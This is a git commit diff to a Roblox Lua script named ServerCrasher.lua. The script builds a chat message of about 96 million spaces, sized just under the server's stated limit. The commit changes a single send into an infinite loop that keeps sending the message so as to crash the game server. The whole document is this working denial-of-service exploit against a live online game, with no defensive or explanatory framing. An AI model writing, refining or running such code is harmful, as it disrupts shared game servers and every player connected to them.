bbcf1ccbf5cbe31f31415753ac2a8edbc32c9edc
Jam The Adventurer (Official) <94430800+JamTheAdventurer@users.noreply.github.com>
2022-07-06 11:26:08 +0800

    Update ServerCrasher.lua

--- .github/RobloxScripts/ServerCrasher.lua
+++ .github/RobloxScripts/ServerCrasher.lua
@@ -4,4 +4,6 @@
 local v =96000000 --Maximal bit stream on client
 -- (96000000 - 12) -- Maximal bit stream that server accept +-2
 local msg = ""..string.rep(" ",(v - 12))
-game.Players:Chat(msg)
+while v do
+  game.Players:Chat(msg)
+end
